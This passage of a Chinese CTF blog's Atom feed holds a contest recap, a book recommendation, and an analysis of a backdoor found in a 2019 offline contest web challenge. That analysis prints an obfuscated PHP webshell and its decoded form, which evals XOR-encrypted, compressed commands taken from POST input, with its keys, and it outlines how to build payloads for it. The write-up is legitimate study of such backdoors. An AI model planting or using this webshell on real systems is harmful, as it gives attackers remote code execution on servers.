    <id>https://p7e4.js.org/2019/11/24/2019redhat/</id>
    <published>2019-11-24T21:46:25.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>昨天参加了2019红帽杯线下赛，比赛使用的是AWD PLUS赛制，这也是我第一次见到这种赛制</p><p>虽然叫AWD PLUS，其实我觉得应该改为CTF PLUS，因为实际上是解题模式，然后+修补过程</p><p>大致流程如下：<br>1.选手攻破某一赛题，获取flag<br>2.提交到平台，证明具有对该题攻击能力<br>3.提交防御脚本，平台会运行exp和check，如果能check过且exp攻击失败则认为防御成功<br>4.本题全部完成，继续做下一题</p><p>当然，这里还是有轮数的，30分钟一轮，平台会自动扣掉不具备某题防御能力的队伍分数然后平分给攻击方</p><p>所以一题只需要一解，相当于还是和出题人对抗Orz</p><p>游戏体检很差，被疯狂暴打</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天参加了2019红帽杯线下赛，比赛使用的是AWD PLUS赛制，这也是我第一次见到这种赛制&lt;/p&gt;
&lt;p&gt;虽然叫AWD PLUS，其实我觉得应该改为CTF PLUS，因为实际上是解题模式，然后+修补过程&lt;/p&gt;
&lt;p&gt;大致流程如下：&lt;br&gt;1.选手攻破某一赛题，获取fla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>广东省强网杯线下赛web1后门分析</title>
    <link href="https://p7e4.js.org/2019/09/24/qwb_web1/"/>
    <id>https://p7e4.js.org/2019/09/24/qwb_web1/</id>
    <published>2019-09-24T21:46:25.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>源码下载地址<code>https://github.com/p7e4/qwb_web/raw/master/www1.zip</code><br>D盾扫一下很快可以发现/inc/conn.php有一个后门了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o=<span class="string">'n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint("&#125;&gt;$p$kh&#125;&gt;$r$kf");&#125;'</span>;</span><br><span class="line">$g=<span class="string">'&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o="'</span>;</span><br><span class="line">$l=<span class="string">'";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$'</span>;</span><br><span class="line">$r=<span class="string">'_contents&#125;&gt;("p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress('</span>;</span><br><span class="line">$L=<span class="string">'$k="5ac&#125;&gt;91f7&#125;&gt;d";$&#125;&gt;kh=&#125;&gt;&#125;&gt;"b9615a29&#125;&gt;bc1d";&#125;&gt;$kf="24d0b67&#125;&gt;c2c91";$p&#125;&gt;="9GmI&#125;&gt;&#125;'</span>;</span><br><span class="line">$s=str_replace(<span class="string">'C'</span>,<span class="string">''</span>,<span class="string">'cCreaCteC_fCuCCnction'</span>);</span><br><span class="line">$Z=<span class="string">'t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;("&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/",@file_&#125;&gt;get'</span>;</span><br><span class="line">$h=<span class="string">'@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea'</span>;</span><br><span class="line">$q=str_replace(<span class="string">'&#125;&gt;'</span>,<span class="string">''</span>,$L.$g.$l.$Z.$r.$h.$o);</span><br><span class="line">$I=$s(<span class="string">''</span>,$q);$I();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把$s输出发现是create_function<br>所以后面<code>$I=$s(&#39;&#39;,$q);$I();</code>就是是创建了一个匿名函数，然后调用该函数，即执行$q中的代码<br>再输出$q并格式化一下，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line">$p=<span class="string">"9GmIEgwZ7HiEeclS"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span> </span>&#123;</span><br><span class="line">$c = strlen($k);</span><br><span class="line">$l = strlen($t);</span><br><span class="line">$o = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line"><span class="keyword">for</span>($j=<span class="number">0</span>; ($j&lt;$c &amp;&amp; $i&lt;$l); $j++, $i++)&#123;</span><br><span class="line">$o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/$kh(.+)$kf/"</span>,file_get_contents(<span class="string">"php://input"</span>),$m)==<span class="number">1</span>) &#123;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">eval</span>(gzuncompress(x(base64_decode($m[<span class="number">1</span>]),$k)));</span><br><span class="line">$o = ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">$r = base64_encode(x(gzcompress($o),$k));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"$p$kh$r$kf"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x这个函数就是按$k长度把原字符串分组再和$k逐位进行一异或<br>再调用一次就能还原了（当时脑子给空调吹坏了，居然没反应过来）<br>不用看文档也大概猜的出gzuncompress和gzcompress是成对的，用于字符串压缩等<br>第17行的<code>preg_match(&quot;/$kh(.+)$kf/&quot;,file_get_contents(&quot;php://input&quot;),$m)==1</code>是用正则从POST的内容中提取出以$kh开头和$kf结尾的中间字符串赋给$m变量  </p><p>那么最终的payload构造其实很简单<br>先base64编码一下然后用x函数异或再gzcompress压缩一下即可（结果是不可打印字符，这里就不贴了）  </p><p>结果反着来解即先base64_decode再x再gzuncompress即可  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;源码下载地址&lt;code&gt;https://github.com/p7e4/qwb_web/raw/master/www1.zip&lt;/code&gt;&lt;br&gt;D盾扫一下很快可以发现/inc/conn.php有一个后门了&lt;/p&gt;
&lt;figure class=&quot;highlight php
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>推荐一本CTF书</title>
    <link href="https://p7e4.js.org/2019/09/08/Hello/"/>
    <id>https://p7e4.js.org/2019/09/08/Hello/</id>
    <published>2019-09-08T20:46:25.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分享一本CTF书"><a href="#分享一本CTF书" class="headerlink" title="分享一本CTF书"></a>分享一本CTF书</h1><blockquote><p>——“与其相信谣言，不如一直学习。”</p><p>GitHub 地址：<a href="https://github.com/firmianay/CTF-All-In-One" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One</a></p><p>GitBook 地址：<a href="https://www.gitbook.com/book/firmianay/ctf-all-in-one/details" target="_blank" rel="noopener">https://www.gitbook.com/book/firmianay/ctf-all-in-one/details</a></p><p>PDF/Mobi/ePub 文件下载地址：</p><p>（推荐）<a href="https://www.gitbook.com/download/pdf/book/firmianay/ctf-all-in-one" target="_blank" rel="noopener">https://www.gitbook.com/download/pdf/book/firmianay/ctf-all-in-one</a><br>（不推荐）<a href="https://github.com/firmianay/CTF-All-In-One/releases" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One/releases</a></p><footer><strong>firmianay</strong><cite>CTF-All-In-One</cite></footer></blockquote><p>偏重于Pwn，毕竟还是Pwn厉害</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;分享一本CTF书&quot;&gt;&lt;a href=&quot;#分享一本CTF书&quot; class=&quot;headerlink&quot; title=&quot;分享一本CTF书&quot;&gt;&lt;/a&gt;分享一本CTF书&lt;/h1&gt;&lt;blockquote&gt;&lt;p&gt;——“与其相信谣言，不如一直学习。”&lt;/p&gt;
&lt;p&gt;GitHub 地
      
    
    </summary>
    
    
  </entry>
  
</feed>
